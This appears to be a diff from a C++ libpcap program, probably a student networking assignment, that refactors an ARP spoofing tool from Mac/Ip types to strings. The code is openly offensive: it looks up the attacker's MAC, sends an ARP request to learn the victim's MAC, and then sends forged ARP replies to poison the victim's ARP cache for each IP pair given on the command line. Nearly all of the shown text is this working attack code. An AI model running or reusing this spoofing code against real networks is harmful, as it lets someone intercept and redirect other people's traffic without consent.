@@ -18,7 +18,7 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
-Mac getMACAddress(const char* interface) {
+std::string getMACAddress(const char* interface) {
     struct sockaddr_in *addr;
     struct ifreq ifr;
 
@@ -41,58 +41,50 @@ Mac getMACAddress(const char* interface) {
 
     close(sock);
 
-    // // MAC 주소를 문자열로 변환
-     char macAddrStr[18];
-     sprintf(macAddrStr, "%02X:%02X:%02X:%02X:%02X:%02X",
-             (unsigned char)ifr.ifr_hwaddr.sa_data[0],
-             (unsigned char)ifr.ifr_hwaddr.sa_data[1],
-             (unsigned char)ifr.ifr_hwaddr.sa_data[2],
-             (unsigned char)ifr.ifr_hwaddr.sa_data[3],
-             (unsigned char)ifr.ifr_hwaddr.sa_data[4],
-             (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
+    // MAC 주소를 문자열로 변환
+    char macAddrStr[18];
+    sprintf(macAddrStr, "%02X:%02X:%02X:%02X:%02X:%02X",
+            (unsigned char)ifr.ifr_hwaddr.sa_data[0],
+            (unsigned char)ifr.ifr_hwaddr.sa_data[1],
+            (unsigned char)ifr.ifr_hwaddr.sa_data[2],
+            (unsigned char)ifr.ifr_hwaddr.sa_data[3],
+            (unsigned char)ifr.ifr_hwaddr.sa_data[4],
+            (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
 
-    // return std::string(macAddrStr);
-    
-    return Mac(macAddrStr);
+    return std::string(macAddrStr);
 }
 
-EthArpPacket make_arp_packet(Mac dst_mac, Mac src_mac, uint16_t operation, Mac smac, Ip sip, Mac tmac, Ip tip) {
+EthArpPacket make_arp_packet(std::string dst_mac, std::string src_mac, uint16_t operation, std::string smac, const char* sip, std::string tmac, const char* tip) {
     EthArpPacket packet;
-
-    packet.eth_.dmac_ = dst_mac;
-    packet.eth_.smac_ = src_mac;
+    packet.eth_.dmac_ = Mac(dst_mac.c_str());
+    packet.eth_.smac_ = Mac(src_mac.c_str());
     packet.eth_.type_ = htons(EthHdr::Arp);
-
+    
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(operation);
-    packet.arp_.smac_ = smac;
-    packet.arp_.sip_ = htonl(sip);
-    packet.arp_.tmac_ = tmac;
-    packet.arp_.tip_ = htonl(tip);
+    packet.arp_.smac_ = Mac(smac.c_str());
+    packet.arp_.sip_ = htonl(Ip(sip));
+    packet.arp_.tmac_ = Mac(tmac.c_str());
+    packet.arp_.tip_ = htonl(Ip(tip));
     
     return packet;
 }
 
 
-Mac arp_request(Ip victim_ip, Ip attacker_ip, Mac attacker_mac, pcap_t* handle) {
+std::string arp_request(const char* victim_ip, const char* attacker_ip, std::string attacker_mac, pcap_t* handle) {
     //request => sender = attacker, target = victim
-    EthArpPacket packet = make_arp_packet(Mac("ff:ff:ff:ff:ff:ff"), attacker_mac, 
+    EthArpPacket packet = make_arp_packet("ff:ff:ff:ff:ff:ff", attacker_mac, 
     					  ArpHdr::Request, attacker_mac, 
-    					  attacker_ip, Mac("00:00:00:00:00:00"), 
+    					  attacker_ip, "00:00:00:00:00:00", 
     					  victim_ip);
     
-    for (int i=0; i<5; i++) {
-        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-        if (res != 0) {
-            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-            exit(1);
-        
-        }
-        sleep(1);
-        printf("request arp...\n");
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        exit(1);
     }
     while (true) {
         struct pcap_pkthdr* header;
@@ -110,10 +102,10 @@ Mac arp_request(Ip victim_ip, Ip attacker_ip, Mac attacker_mac, pcap_t* handle) 
         }
     }
         
-    return Mac(packet.arp_.smac_);
+    return std::string(packet.arp_.smac_);
 }
 
-void arp_reply(Ip victim_ip, Ip attacker_ip, Mac victim_mac, Mac attacker_mac, pcap_t* handle) {
+void arp_reply(const char* victim_ip, const char* attacker_ip, std::string victim_mac, std::string attacker_mac, pcap_t* handle) {
     //request => sender = victim, target = attacker
     EthArpPacket packet = make_arp_packet(victim_mac, attacker_mac, 
     					  ArpHdr::Reply, victim_mac, 
@@ -149,15 +141,13 @@ int main(int argc, char* argv[]) {
     const char* interface = argv[1];
     
     for (int i=2; i<argc; i+=2) {
-        Mac attacker_mac = getMACAddress(interface);
-        std::string amac_print = std::string(attacker_mac);
-        printf("Attacker MAC = %s\n", amac_print.c_str());
+        std::string attacker_mac = getMACAddress(interface);
+        printf("Attacker MAC = %s\n", attacker_mac.c_str());
         
-        Mac victim_mac = arp_request(Ip(argv[i]), Ip(argv[i+1]), attacker_mac, handle);
-        std::string vmac_print = std::string(victim_mac);
-        printf("Victim MAC = %s\n", vmac_print.c_str());
+        std::string victim_mac = arp_request(argv[i], argv[i+1], attacker_mac, handle);
+        printf("Victim MAC = %s\n", victim_mac.c_str());
         
-        arp_reply(Ip(argv[i]), Ip(argv[i+1]), victim_mac, attacker_mac, handle);
+        arp_reply(argv[i], argv[i+1], victim_mac, attacker_mac, handle);
         printf("%d done\n", i/2);
         printf("====================\n");
     }
@@ -165,5 +155,3 @@ int main(int argc, char* argv[]) {
     pcap_close(handle);
     printf("all done\n");
 }
-
-//Map<Ip, Mac> AT;
